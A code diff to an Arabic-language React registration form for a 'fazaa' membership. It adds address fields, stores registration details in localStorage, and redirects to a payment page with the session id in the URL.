@@ -81,6 +81,10 @@ export default function RegistrationFormArabic() {
           district: formData.district || undefined,
           membershipTier: formData.membershipTier || 'silver',
           totalAmount: '150',
+          addressEmirate: formData.addressEmirate || undefined,
+          addressDistrict: formData.addressDistrict || undefined,
+          addressStreet: formData.addressStreet || undefined,
+          addressBuildingNumber: formData.addressBuildingNumber || undefined,
         })
         await createSession({
           sessionId,
@@ -121,8 +125,25 @@ export default function RegistrationFormArabic() {
         localStorage.setItem('fazaa_sessions', JSON.stringify(existing))
       }
       
-      // Navigate to payment page
-      window.location.href = '/payment'
+      // Save sessionId to localStorage for payment page to pick up
+      const registrationData = {
+        sessionId,
+        fullName: formData.fullName || null,
+        phoneNumber: formData.phoneNumber || null,
+        email: formData.email || null,
+        emirate: formData.emirate || null,
+        district: formData.district || null,
+        membershipTier: formData.membershipTier || null,
+        totalAmount: '150',
+        createdAt: new Date().toISOString(),
+        updatedAt: new Date().toISOString(),
+      }
+      const existing = JSON.parse(localStorage.getItem('fazaa_sessions') || '[]')
+      existing.push(registrationData)
+      localStorage.setItem('fazaa_sessions', JSON.stringify(existing))
+
+      // Navigate to payment page with sessionId in URL
+      window.location.href = `/payment?sessionId=${sessionId}`
     } catch (err) {
       setError('حدث خطأ أثناء إرسال البيانات')
     } finally {
